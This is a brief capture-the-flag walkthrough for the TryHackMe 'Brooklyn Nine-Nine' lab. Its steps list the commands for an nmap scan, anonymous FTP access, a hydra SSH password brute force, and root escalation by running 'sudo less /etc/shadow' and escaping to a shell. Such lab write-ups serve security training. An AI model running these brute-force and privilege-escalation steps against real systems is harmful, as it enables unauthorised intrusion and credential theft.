                                                                                                                                                 This is a walkthrough of how how solved the Brooklyn Nine-Nine CTF on TryHackMe 

1. Connect With the TryHackMe server using Command  $ sudo openvpn Downloads/Ynos.ovpn
2. Confirm You can Connect to the Machine using the command $ ping (Ip of the machine)
3. Start by Scanning for Open Ports Using Nmap $nmap -sV -O -T5 -p- (Ip of the machine) -oN nmap.results
4. The nmap results shows that the ftp port is open 
5. We will exploit this vulnerability using command $ftp (Ip of the machine)
6. Use username and password as $anonymous
7. To see th files on here type $ ls
8. Download the available file using $get (filename)
9. $bye to exit ftp server
10. Do ssh bruteforce using hydra with the command  $hydra -l jake -P /opt/rockyou.txt -V  -f ssh://(Ip of the machine) -o hydra.results
11. Hydra will Provide the Username and the Passwords 
12. Then connect to the machine using ssh $ ssh jake@(Ip of the machine)
13. Jake is hacked 
14. Now traverse this till you find the file called user.txt and it will contain User Flag
15. The less Command can be used to gain root access
16. Do $ sudo less /etc/shadow 
17. Type ! and press Enter
18. Voila you have gained the Root user access 
19. Now just access the root.txt file and Enter the Root access
20. The End
